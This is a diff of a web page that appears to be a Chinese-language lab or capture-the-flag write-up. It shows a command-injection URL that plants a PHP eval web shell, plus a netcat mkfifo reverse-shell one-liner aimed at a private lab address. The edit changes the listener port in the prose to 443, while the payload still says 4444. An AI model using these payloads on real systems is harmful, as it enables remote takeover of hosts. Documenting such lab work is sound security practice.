@@ -509,7 +509,7 @@ http://192.168.113.154/site/busque.php?buscar=echo &#39;&lt;?php eval($_POST[&qu
 <pre><code>
 &lt;?php system(&quot;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.113.154 4444 &gt;/tmp/f &quot;); ?&gt;
 
-</code></pre><p>在本地监听4444端口，然后访问<strong><a target="_blank" rel="noopener" href="http://192.168.113.154/site/shell.php">http://192.168.113.154/site/shell.php</a></strong></p>
+</code></pre><p>在本地监听443端口，然后访问<strong><a target="_blank" rel="noopener" href="http://192.168.113.154/site/shell.php">http://192.168.113.154/site/shell.php</a></strong>（好像只有443端口可以监听成功）</p>
 <blockquote>
 <p>nc -nlvp  443</p>
 </blockquote>
